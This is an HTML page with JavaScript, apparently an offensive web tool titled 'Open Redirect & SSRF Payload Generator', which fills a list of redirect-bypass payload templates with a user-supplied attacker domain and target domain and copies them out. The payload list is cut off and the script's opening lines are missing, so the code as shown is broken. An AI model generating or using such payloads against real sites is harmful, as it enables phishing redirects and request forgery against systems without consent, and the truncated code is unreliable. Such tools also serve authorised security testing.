<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect & SSRF Payload Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            background-color: #212121;
            color: #f0f0f0;
            padding: 20px;
            box-sizing: border-box;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 30px;
            text-align: center;
        }
        label, input, button {
            font-size: 1em;
            margin: 5px 0;
        }
        input {
            padding: 5px;
            width: 300px;
        }
        button {
            background-color: #b50bdb;
            color: white;
            border: none;
            padding: 6px 12px;
            cursor: pointer;
            margin-left: 5px;
        }
        button:hover {
            background-color: #b94bd1;
        }
        textarea {
            width: 100%;
            height: 400px;
            margin-top: 20px;
            background-color: #333;
            color: #f0f0f0;
            padding: 10px;
            border: 1px solid #555;
            resize: vertical;
            white-space: pre;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <h1>Open Redirect & SSRF Payload Generator</h1>

    <label for="domainInput">Attacker Domain:</label>
    <input type="text" id="domainInput" placeholder="attacker.com">
    <br>
    <label for="targetInput">Target Domain:</label>
    <input type="text" id="targetInput" placeholder="target.com">
    <br>
    <button id="generateButton">Generate Payloads</button>
    <button id="copyButton">Copy All</button>

    <textarea id="payloadOutput" readonly placeholder="Generated payloads will appear here..."></textarea>

`/http:attacker.com`,
`/.attacker.com`,
`///\;@attacker.com`,
`/////attacker.com/`,
`/////attacker.com`
        ];

        document.getElementById("generateButton").addEventListener("click", () => {
            const attacker = document.getElementById("domainInput").value.trim();
            const target = document.getElementById("targetInput").value.trim();
            if (!attacker || !target) return alert("Both attacker and target domains are required.");

            const output = payloadTemplates.map(p =>
                p.replace(/attacker\.com/g, attacker).replace(/target\.com/g, target)
            ).join("\n");

            document.getElementById("payloadOutput").value = output;
        });

        document.getElementById("copyButton").addEventListener("click", () => {
            const outputField = document.getElementById("payloadOutput");
            outputField.select();
            document.execCommand("copy");
            alert("Payloads copied to clipboard!");
        });
    </script>
</body>
</html>
